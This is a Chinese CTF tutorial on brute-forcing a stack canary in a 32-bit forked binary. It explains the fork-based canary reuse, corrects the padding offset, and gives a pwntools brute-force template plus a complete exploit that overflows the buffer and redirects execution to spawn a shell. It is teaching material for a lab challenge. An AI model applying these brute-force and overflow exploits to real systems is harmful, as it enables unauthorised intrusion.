> 参考资料：[https://blog.csdn.net/AcSuccess/article/details/104119680](https://blog.csdn.net/AcSuccess/article/details/104119680)
>
> 附件下载：链接：[https://pan.baidu.com/s/1Xixholq_JWSTJQQuHxYNcA](https://pan.baidu.com/s/1Xixholq_JWSTJQQuHxYNcA)
>
> 提取码：xauv 
>

# 此篇文章的更新与补充
> **<font style="color:#DF2A3F;background-color:#FBDE28;">更新时间：2023年10月06日，感谢</font>**[@鸡鸭](undefined/u34082223)**<font style="color:#DF2A3F;background-color:#FBDE28;">师傅提出的问题。</font>**
>

有师傅在**此篇文章**的评论区问道“exp中canary后面为什么要跟12字节垃圾数据呢？”：

![](https://cdn.nlark.com/yuque/0/2023/png/574026/1696591184985-dd7ae9f6-0c9d-488a-897d-e03b053aefbd.png)

我看了一眼最后的payload：`payload = 'A' * 100 + canary + 'A' * 12 + p32(addr)`，唉<font style="color:rgb(77, 81, 86);">↗</font>，对哦，为什么呢？在我印象里canary不应该是和ebp相邻的吗？如下所示：

```c
...（一些栈帧里的数据）
canary			// 假设canary的偏移为offset_0，则
ebp				// offset_4
return_addr 	// offset_8
```

然后我用gdb调试了一下程序，发现canary和ebp还真不是这样：

![](https://cdn.nlark.com/yuque/0/2023/png/574026/1696591904320-6ec3208d-54e5-43cc-a90a-c4e4e3ae8c4b.png)

再看一眼汇编代码，32位程序的canary是保存在了`mov    dword ptr [ebp - 0xc], eax`，而非`mov    dword ptr [ebp - 0x4], eax`！所以32位程序的栈结构准确来说应该为：

```c
...（一些栈帧里的数据）
canary
...	(杂数据，注意函数的栈帧在回收后并不会清空里面的数据)
...	(杂数据，注意函数的栈帧在回收后并不会清空里面的数据)
ebp
return_addr
```

然后我又在网上搜了一下，发现不同编译器编译出来的程序canary位置可能不同，比如对于ubuntu来说：使用gcc编译出来的32位程序canary会被写在`ebp - 0xc`，64位程序则在`rbp - 0x8`，后者的canary才和栈底相邻，也就是说`[https://www.yuque.com/cyberangel/rg9gdm/yfrste](https://www.yuque.com/cyberangel/rg9gdm/yfrste)`里的图**<font style="color:#DF2A3F;">并不准确</font>**：

![](https://cdn.nlark.com/yuque/0/2023/png/574026/1696592551774-f91f0b86-5797-48ec-b227-f91cc1c945b3.png)

> **<font style="background-color:#FBDE28;">总结：</font>**
>
> **<font style="background-color:#FBDE28;">1、对于ubuntu来说，32位程序的canary一般在</font>**`**<font style="background-color:#FBDE28;">ebp - 0xc</font>**`**<font style="background-color:#FBDE28;">，不和ebp（栈底）相邻；64位一般在</font>**`**<font style="background-color:#FBDE28;">rbp - 0x8</font>**`**<font style="background-color:#FBDE28;">，与栈底相邻。</font>**
>
> **<font style="background-color:#FBDE28;">2、此篇文章题目的payload更确切应为：</font>**`**<font style="background-color:#FBDE28;">payload = 'A' * 100 + canary + 'B' * 8 + 'C' * 4 + p32(addr)</font>**`**<font style="background-color:#FBDE28;">（'B' * 8用于填充，'C' * 4为fake ebp）。</font>**
>
> ![](https://cdn.nlark.com/yuque/0/2023/png/574026/1696594194721-20d41f4b-4966-4df5-9f2e-a01c476ecb96.png)
>

# 爆破原理
+ 对于Canary，虽然每次进程重启后Canary不同，但是**<font style="color:#F5222D;">同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存</font>**。
+ 最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。
+ 我们可以利用这样的特点，彻底逐个字节将Canary爆破出来。

> 什么？你说canary是什么？请参考如下资料
>

[PWN入门（1-1-3）-Linux ELF文件保护机制](https://www.yuque.com/go/doc/11118064)

# 示例
我们使用附件中的示例来进行说明。

请现在同级文件夹下创建名为“flag”的文本文档（无.txt（扩展名）），

并向其中写入任意的flag（我的为：flag{WOW_YOU_PWN_ME!!!}）

首先检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597837299454-21ed34a6-998e-4d86-9b7e-3abfc93bc862.png)

32位程序，开启了Canary保护和NX保护，将文件扔到IDA中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597837357828-bb762423-787e-4964-a7f3-8aabedac290f.png)

从上图中可以看到，main函数中存在着fork函数，这是我们爆破Canary的重点。

进入fun()函数：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597837442748-e365c4a8-a35f-4d93-babb-3b24aff2b77d.png)

发现 read(0, &buf, 0x78u);通过对栈段进行查看，我们可以输入0x78的内容，但是buf的空间为：0x70-0xC=0x64，很明显可以发生栈溢出覆盖其他变量。其中v2就是保存Canary的变量。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597837872784-684ddd28-719f-46d7-938d-b941ffd58c2f.png)

所以我们的思路是一位一位的来爆破Canary，详细点来说使用栈溢出填充垃圾字符直到Canary，然后再尝试填充我们的Canary。若Canary正确，则进行下一位的爆破；若Canary错误，程序会执行fork重新运行。

> 注：Canary的形式填充到寄存器中的形式为：aaaax\00
>

下面是爆破Canary的通用模板：

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='i386', os='linux')
local = 1
elf = ELF('./bin1')

if local:
    p = process('./bin1')
    #libc = elf.libc

else:
    p = remote('',)
    libc = ELF('./')
p.recvuntil('welcome\n')
canary = '\x00'
for k in range(3):
    for i in range(256):
        print "正在爆破Canary的第" + str(k+1)+"位" 
        print "当前的字符为"+ chr(i)
        payload='a'*100 + canary + chr(i)
        print "当前payload为：",payload
        p.send('a'*100 + canary + chr(i))
        data=p.recvuntil("welcome\n")
        print data
        if "sucess" in data:
            canary += chr(i)
            print "Canary is: " + canary
            break
```

下面是此题的exp：

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='i386', os='linux')
local = 1
elf = ELF('./bin1')

if local:
    p = process('./bin1')
    #libc = elf.libc

else:
    p = remote('',)
    libc = ELF('./')
p.recvuntil('welcome\n')
canary = '\x00'
for k in range(3):
    for i in range(256):
        print "正在爆破Canary的第" + str(k+1)+"位" 
        print "当前的字符为"+ chr(i)
        payload='a'*100 + canary + chr(i)
        print "当前payload为：",payload
        p.send('a'*100 + canary + chr(i))
        data=p.recvuntil("welcome\n")
        print data
        if "sucess" in data:
            canary += chr(i)
            print "Canary is: " + canary
            break
addr = 0x0804863B
payload = 'A' * 100 + canary + 'A' * 12 + p32(addr)

p.send(payload)
p.interactive()
```

getshell

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597840200583-d6f86533-565f-40f3-a398-02314769bf5a.png)

